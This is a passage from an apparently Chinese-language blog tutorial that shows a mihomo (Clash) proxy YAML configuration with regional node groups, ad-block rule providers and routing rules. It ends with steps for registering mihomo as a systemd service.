<span class="attr">filter:</span> <span class="string">&quot;(?i)英|uk|united kingdom|london&quot;</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">http://www.gstatic.com/generate_204</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">tolerance:</span> <span class="number">100</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🇩🇪</span> <span class="string">德国节点</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">url-test</span></span><br><span class="line">    <span class="attr">include-all-providers:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">filter:</span> <span class="string">&quot;(?i)德|de|germany|frankfurt&quot;</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">http://www.gstatic.com/generate_204</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">tolerance:</span> <span class="number">100</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🇫🇷</span> <span class="string">法国节点</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">url-test</span></span><br><span class="line">    <span class="attr">include-all-providers:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">filter:</span> <span class="string">&quot;(?i)法|fr|france|paris&quot;</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">http://www.gstatic.com/generate_204</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">tolerance:</span> <span class="number">100</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🇮🇳</span> <span class="string">印度节点</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">url-test</span></span><br><span class="line">    <span class="attr">include-all-providers:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">filter:</span> <span class="string">&quot;(?i)印度|in|india|mumbai&quot;</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">http://www.gstatic.com/generate_204</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">tolerance:</span> <span class="number">100</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🇸🇬</span> <span class="string">狮城节点</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">url-test</span></span><br><span class="line">    <span class="attr">include-all-providers:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">filter:</span> <span class="string">&quot;(?i)新|sg|singapore&quot;</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">http://www.gstatic.com/generate_204</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">tolerance:</span> <span class="number">100</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🇮🇩</span> <span class="string">印尼节点</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">url-test</span></span><br><span class="line">    <span class="attr">include-all-providers:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">filter:</span> <span class="string">&quot;(?i)印尼|印度尼西亚|id|indonesia|jakarta&quot;</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">http://www.gstatic.com/generate_204</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">tolerance:</span> <span class="number">100</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🇻🇳</span> <span class="string">越南节点</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">url-test</span></span><br><span class="line">    <span class="attr">include-all-providers:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">filter:</span> <span class="string">&quot;(?i)越南|vn|vietnam&quot;</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">http://www.gstatic.com/generate_204</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">tolerance:</span> <span class="number">100</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🇹🇭</span> <span class="string">泰国节点</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">url-test</span></span><br><span class="line">    <span class="attr">include-all-providers:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">filter:</span> <span class="string">&quot;(?i)泰国|th|thailand|bangkok&quot;</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">http://www.gstatic.com/generate_204</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">tolerance:</span> <span class="number">100</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🇦🇺</span> <span class="string">澳洲节点</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">url-test</span></span><br><span class="line">    <span class="attr">include-all-providers:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">filter:</span> <span class="string">&quot;(?i)澳大利亚|au|australia|sydney&quot;</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">http://www.gstatic.com/generate_204</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">tolerance:</span> <span class="number">100</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🇧🇷</span> <span class="string">巴西节点</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">url-test</span></span><br><span class="line">    <span class="attr">include-all-providers:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">filter:</span> <span class="string">&quot;(?i)巴西|br|brazil&quot;</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">http://www.gstatic.com/generate_204</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">tolerance:</span> <span class="number">100</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🌍</span> <span class="string">其他节点</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">url-test</span></span><br><span class="line">    <span class="attr">include-all-providers:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">filter:</span> <span class="string">&quot;(?i)^(?!.*(香港|台湾|日本|韩国|新加坡|美国|英国|德国|法国|印度|泰国|越南|印尼|澳大利亚|巴西|港|台|日|韩|新|美|英|德|法|印|泰|越|尼|澳|巴|hk|tw|jp|kr|sg|us|uk|de|fr|in|th|vn|id|au|br)).*&quot;</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">http://www.gstatic.com/generate_204</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">tolerance:</span> <span class="number">100</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">#------------------------场景分组------------------------#</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🎬</span> <span class="string">国外媒体</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🚀</span> <span class="string">节点选择</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇭🇰</span> <span class="string">香港节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇨🇳</span> <span class="string">台湾节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇯🇵</span> <span class="string">日本节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇺🇲</span> <span class="string">美国节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇸🇬</span> <span class="string">狮城节点</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🎮</span> <span class="string">游戏平台</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🚀</span> <span class="string">节点选择</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🔯</span> <span class="string">故障转移</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇭🇰</span> <span class="string">香港节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇯🇵</span> <span class="string">日本节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇺🇲</span> <span class="string">美国节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇸🇬</span> <span class="string">狮城节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DIRECT</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">📱</span> <span class="string">即时通讯</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🚀</span> <span class="string">节点选择</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🔯</span> <span class="string">故障转移</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇭🇰</span> <span class="string">香港节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇯🇵</span> <span class="string">日本节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇺🇲</span> <span class="string">美国节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇸🇬</span> <span class="string">狮城节点</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🤖</span> <span class="string">AI平台</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇯🇵</span> <span class="string">日本节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇺🇲</span> <span class="string">美国节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇸🇬</span> <span class="string">狮城节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇰🇷</span> <span class="string">韩国节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🚀</span> <span class="string">节点选择</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🔯</span> <span class="string">故障转移</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🔧</span> <span class="string">GitHub</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🚀</span> <span class="string">节点选择</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🔯</span> <span class="string">故障转移</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇭🇰</span> <span class="string">香港节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇨🇳</span> <span class="string">台湾节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇯🇵</span> <span class="string">日本节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇺🇲</span> <span class="string">美国节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇸🇬</span> <span class="string">狮城节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DIRECT</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Ⓜ️</span> <span class="string">微软服务</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🚀</span> <span class="string">节点选择</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇭🇰</span> <span class="string">香港节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇨🇳</span> <span class="string">台湾节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇯🇵</span> <span class="string">日本节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇺🇲</span> <span class="string">美国节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇸🇬</span> <span class="string">狮城节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DIRECT</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🍎</span> <span class="string">苹果服务</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🚀</span> <span class="string">节点选择</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇭🇰</span> <span class="string">香港节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇨🇳</span> <span class="string">台湾节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇯🇵</span> <span class="string">日本节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇺🇲</span> <span class="string">美国节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇸🇬</span> <span class="string">狮城节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DIRECT</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">#------------------------特殊分组------------------------#</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🎯</span> <span class="string">全球直连</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DIRECT</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🚀</span> <span class="string">节点选择</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🛑</span> <span class="string">广告拦截</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">REJECT</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DIRECT</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🍃</span> <span class="string">应用净化</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">REJECT</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DIRECT</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🆎</span> <span class="string">AdBlock</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">REJECT</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DIRECT</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🛡️</span> <span class="string">隐私防护</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">REJECT</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DIRECT</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🐟</span> <span class="string">漏网之鱼</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🚀</span> <span class="string">节点选择</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🎯</span> <span class="string">全球直连</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">♻️</span> <span class="string">自动选择</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🔯</span> <span class="string">故障转移</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 规则提供商配置 - 优化版</span></span><br><span class="line"><span class="attr">rule-providers:</span></span><br><span class="line">  <span class="comment"># 广告规则</span></span><br><span class="line">  <span class="attr">reject:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">domain</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;https://cdn.jsdelivr.net/gh/Loyalsoldier/clash-rules@release/reject.txt&quot;</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./ruleset/reject.yaml</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 隐私规则</span></span><br><span class="line">  <span class="attr">privacy:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">domain</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;https://cdn.jsdelivr.net/gh/blackmatrix7/ios_rule_script/rule/Clash/Privacy/Privacy.yaml&quot;</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./ruleset/privacy.yaml</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 广告扩展规则</span></span><br><span class="line">  <span class="attr">reject-extra:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">domain</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;https://cdn.jsdelivr.net/gh/blackmatrix7/ios_rule_script/rule/Clash/AdvertisingLite/AdvertisingLite.yaml&quot;</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./ruleset/reject-extra.yaml</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># AI平台规则</span></span><br><span class="line">  <span class="attr">ai-platforms:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;https://cdn.jsdelivr.net/gh/blackmatrix7/ios_rule_script/rule/Clash/OpenAI/OpenAI.yaml&quot;</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./ruleset/ai-platforms.yaml</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 流媒体规则</span></span><br><span class="line">  <span class="attr">streaming:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;https://cdn.jsdelivr.net/gh/blackmatrix7/ios_rule_script/rule/Clash/GlobalMedia/GlobalMedia.yaml&quot;</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./ruleset/streaming.yaml</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 社交通讯规则</span></span><br><span class="line">  <span class="attr">social:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;https://cdn.jsdelivr.net/gh/blackmatrix7/ios_rule_script/rule/Clash/Telegram/Telegram.yaml&quot;</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./ruleset/social.yaml</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 微软服务规则</span></span><br><span class="line">  <span class="attr">microsoft:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;https://cdn.jsdelivr.net/gh/blackmatrix7/ios_rule_script/rule/Clash/Microsoft/Microsoft.yaml&quot;</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./ruleset/microsoft.yaml</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 苹果服务规则</span></span><br><span class="line">  <span class="attr">apple:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;https://cdn.jsdelivr.net/gh/blackmatrix7/ios_rule_script/rule/Clash/Apple/Apple.yaml&quot;</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./ruleset/apple.yaml</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 游戏平台规则</span></span><br><span class="line">  <span class="attr">games:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;https://cdn.jsdelivr.net/gh/blackmatrix7/ios_rule_script/rule/Clash/Game/Game.yaml&quot;</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./ruleset/games.yaml</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 开发平台规则</span></span><br><span class="line">  <span class="attr">dev-platforms:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;https://cdn.jsdelivr.net/gh/blackmatrix7/ios_rule_script/rule/Clash/GitHub/GitHub.yaml&quot;</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./ruleset/dev-platforms.yaml</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 规则配置 - 优化版</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="comment"># 优先处理</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">RULE-SET,reject,🛑</span> <span class="string">广告拦截,no-resolve</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">RULE-SET,privacy,🛡️</span> <span class="string">隐私防护,no-resolve</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">RULE-SET,reject-extra,🆎</span> <span class="string">AdBlock,no-resolve</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 本地局域网</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">DOMAIN-SUFFIX,local,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">DOMAIN-SUFFIX,localhost,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">IP-CIDR,127.0.0.0/8,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">IP-CIDR,172.16.0.0/12,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">IP-CIDR,192.168.0.0/16,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">IP-CIDR,10.0.0.0/8,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">IP-CIDR,17.0.0.0/8,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">IP-CIDR,100.64.0.0/10,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">IP-CIDR,224.0.0.0/4,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">IP-CIDR6,fe80::/10,DIRECT</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 应用分流</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">RULE-SET,ai-platforms,🤖</span> <span class="string">AI平台,no-resolve</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">RULE-SET,streaming,🎬</span> <span class="string">国外媒体,no-resolve</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">RULE-SET,social,📱</span> <span class="string">即时通讯,no-resolve</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">RULE-SET,microsoft,Ⓜ️</span> <span class="string">微软服务,no-resolve</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">RULE-SET,apple,🍎</span> <span class="string">苹果服务,no-resolve</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">RULE-SET,games,🎮</span> <span class="string">游戏平台,no-resolve</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">RULE-SET,dev-platforms,🔧</span> <span class="string">GitHub,no-resolve</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 自定义规则</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">PROCESS-NAME,clash,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">PROCESS-NAME,v2ray,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">PROCESS-NAME,xray,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">PROCESS-NAME,naive,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">PROCESS-NAME,trojan,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">PROCESS-NAME,trojan-go,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">PROCESS-NAME,ss-local,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">PROCESS-NAME,privoxy,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">PROCESS-NAME,leaf,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">PROCESS-NAME,Thunder,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">PROCESS-NAME,DownloadService,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">PROCESS-NAME,qBittorrent,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">PROCESS-NAME,Transmission,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">PROCESS-NAME,fdm,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">PROCESS-NAME,aria2c,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">PROCESS-NAME,Folx,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">PROCESS-NAME,NetTransport,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">PROCESS-NAME,uTorrent,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">PROCESS-NAME,WebTorrent,DIRECT</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 地域规则</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">GEOIP,LAN,DIRECT,no-resolve</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">GEOIP,CN,DIRECT,no-resolve</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 兜底规则</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">MATCH,🚀</span> <span class="string">节点选择</span></span><br></pre></td></tr></table></figure>

<p>在上面的配置文件中，一般只需要查看<code>代理提供商配置</code>这部分的内容，并添加上机场给你的配置文件即可。</p>
<h2 id="将mihomo注册为service"><a href="#将mihomo注册为service" class="headerlink" title="将mihomo注册为service"></a>将mihomo注册为service</h2><ol>
<li><p>在将<code>mihomo</code>添加到系统服务之前，最好手动运行一次观察是否正常。</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo /usr/local/bin/mihomo -d /etc/mihomo</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果启动成功，没出现错误信息，那就可以创建 mihomo 服务：</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/systemd/system/mihomo.service</span><br></pre></td></tr></table></figure>
</li>
<li><p>粘贴以下内容</p>
 <figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=mihomo Daemon, Another Clash Kernel.</span><br><span class="line"><span class="attr">After</span>=network.target NetworkManager.service systemd-networkd.service iwd.service</span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">Type</span>=simple</span><br><span class="line"><span class="attr">LimitNPROC</span>=<span class="number">500</span></span><br><span class="line"><span class="attr">LimitNOFILE</span>=<span class="number">1000000</span></span><br><span class="line"><span class="attr">CapabilityBoundingSet</span>=CAP_NET_ADMIN CAP_NET_RAW CAP_NET_BIND_SERVICE CAP_SYS_TIME CAP_SYS_PTRACE CAP_DAC_READ_SEARCH</span><br><span class="line"><span class="attr">AmbientCapabilities</span>=CAP_NET_ADMIN CAP_NET_RAW CAP_NET_BIND_SERVICE CAP_SYS_TIME CAP_SYS_PTRACE CAP_DAC_READ_SEARCH</span><br><span class="line"><span class="attr">Restart</span>=always</span><br><span class="line"><span class="attr">ExecStartPre</span>=/usr/bin/sleep <span class="number">1</span>s</span><br><span class="line"><span class="attr">ExecStart</span>=/usr/local/bin/mihomo -d /etc/mihomo</span><br><span class="line"><span class="attr">ExecReload</span>=/bin/kill -HUP <span class="variable">$MAINPID</span></span><br><span class="line"></span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=multi-user.target</span><br></pre></td></tr></table></figure>
</li>
<li><p>重载<code>systemd</code>并启动<code>mihomo</code>服务</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload # 重载 systemd</span><br><span class="line">systemctl enable mihomo # 允许服务自启动</span><br><span class="line">systemctl start mihomo # 启动服务</span><br></pre></td></tr></table></figure></li>
</ol>
